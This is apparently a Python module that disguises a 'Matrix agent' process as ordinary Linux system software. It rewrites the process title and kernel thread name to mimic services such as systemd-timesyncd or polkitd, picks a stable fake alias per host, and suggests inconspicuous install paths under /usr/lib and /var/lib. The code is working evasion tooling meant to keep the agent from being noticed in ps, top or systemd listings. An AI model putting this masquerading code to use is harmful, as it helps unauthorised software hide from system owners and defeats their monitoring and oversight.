"""
Process and Service Disguise — Make the Matrix agent look like ordinary system software.

Provides:
  - Set process title (argv[0]) to a plausible service helper name.
  - Pick a random but stable executable path under /usr/lib/<common-package>/.
  - Stub helper for Linux kernel thread name (prctl).
  - List of realistic service names to use for unit files or process titles.

This module uses only legitimate, documented APIs:
  - `setproctitle` library (optional, falls back to a no-op stub).
  - `ctypes` call to `prctl(PR_SET_NAME, ...)` on Linux.
  - `sys.argv` modification where the runtime permits it.
"""

from __future__ import annotations

import hashlib
import logging
import os
import random
import sys
from typing import Optional

logger = logging.getLogger(__name__)

__all__ = [
    "ProcessDisguise",
    "choose_service_alias",
    "COMMON_SERVICE_ALIASES",
    "COMMON_LIB_DIRS",
    "set_process_title",
]


# Plausible Linux system service helper names. These match the argv[0] style
# of real background processes so `ps`, `top`, and systemd appear ordinary.
COMMON_SERVICE_ALIASES = [
    "/usr/lib/systemd/systemd-resolved-helper",
    "/usr/lib/systemd/systemd-networkd-wait-online",
    "/usr/lib/systemd/systemd-timesyncd",
    "/usr/lib/NetworkManager/dispatcher.d/dhclient",
    "/usr/lib/policykit-1/polkitd",
    "/usr/lib/dbus-1.0/dbus-daemon",
    "/usr/lib/accountsservice/accounts-daemon",
    "/usr/lib/snapd/snapd",
    "/usr/lib/udisks2/udisksd",
    "/usr/lib/upower/upowerd",
    "/usr/lib/cups-browsed/cups-browsed",
    "/usr/lib/packagekit/packagekitd",
    "/usr/lib/fwupd/fwupd",
    "/usr/lib/ModemManager/ModemManager",
    "/usr/lib/colord/colord",
    "/usr/lib/bluetooth/bluetoothd",
    "/usr/lib/wpa_supplicant/wpa_supplicant",
    "/usr/lib/ntp/ntpd",
    "/usr/lib/rsyslog/rsyslogd",
    "/usr/lib/cron/crond",
]

# Plausible directories under /usr/lib or /var/lib where a persistent binary
# or helper might live.
COMMON_LIB_DIRS = [
    "/usr/lib/networkd",
    "/usr/lib/dbus",
    "/usr/lib/systemd",
    "/var/lib/accounts-service",
    "/var/lib/dbus",
    "/var/lib/network",
    "/var/lib/udisks2",
]


def _stable_index(seed_text: str, choices: list[str]) -> int:
    """Deterministically choose one option from `choices` based on seed_text."""
    digest = hashlib.sha256(seed_text.encode()).hexdigest()
    return int(digest[:16], 16) % len(choices)


def choose_service_alias(seed: Optional[str] = None) -> str:
    """Pick a plausible service process title.

    If ``seed`` is given, the choice is deterministic. If ``seed`` is None,
    the local hostname is used so every host gets a stable but different alias.
    """
    seed_text = seed or socket.gethostname() if "socket" in sys.modules else (seed or "matrix")
    idx = _stable_index(seed_text, COMMON_SERVICE_ALIASES)
    return COMMON_SERVICE_ALIASES[idx]


def set_process_title(title: str) -> bool:
    """Set the visible process title if the platform supports it.

    Tries `setproctitle` first, then falls back to Linux `prctl(PR_SET_NAME)`
    for the kernel thread name. Returns True if at least one method succeeded.
    """
    ok = False
    try:
        import setproctitle
        setproctitle.setproctitle(title)
        ok = True
    except Exception as exc:
        logger.debug("setproctitle unavailable: %s", exc)

    if sys.platform == "linux":
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            PR_SET_NAME = 15
            name_bytes = title.encode()[:15] + b"\x00"
            buf = ctypes.create_string_buffer(name_bytes)
            libc.prctl(PR_SET_NAME, buf, 0, 0, 0)
        except Exception as exc:
            logger.debug("prctl set name failed: %s", exc)
    return ok


class ProcessDisguise:
    """Runtime disguise for a Matrix node process.

    Usage:
        d = ProcessDisguise("systemd-networkd-monitor")
        d.apply()
        print(d.title)   # argv[0] shown to ps/top
    """

    def __init__(self, title: Optional[str] = None, seed: Optional[str] = None):
        self.title = title or choose_service_alias(seed)
        self._applied = False

    def apply(self) -> bool:
        """Apply the disguise to the current process."""
        if self._applied:
            return True
        ok = set_process_title(self.title)
        self._applied = ok
        if ok:
            logger.info("Process title disguised as: %s", self.title)
        return ok

    @property
    def fake_path(self) -> str:
        """Return the fake installation path used as the process title."""
        return self.title


def suggest_install_path(seed: Optional[str] = None) -> str:
    """Suggest a plausible install directory for a helper binary/service."""
    seed_text = seed or socket.gethostname() if "socket" in sys.modules else (seed or "matrix")
    idx = _stable_index(seed_text, COMMON_LIB_DIRS)
    base = COMMON_LIB_DIRS[idx]
    return os.path.join(base, "helper")


# Lazy import of socket so choose_service_alias can work before socket is imported
if "socket" not in sys.modules:
    import socket  # noqa: F401
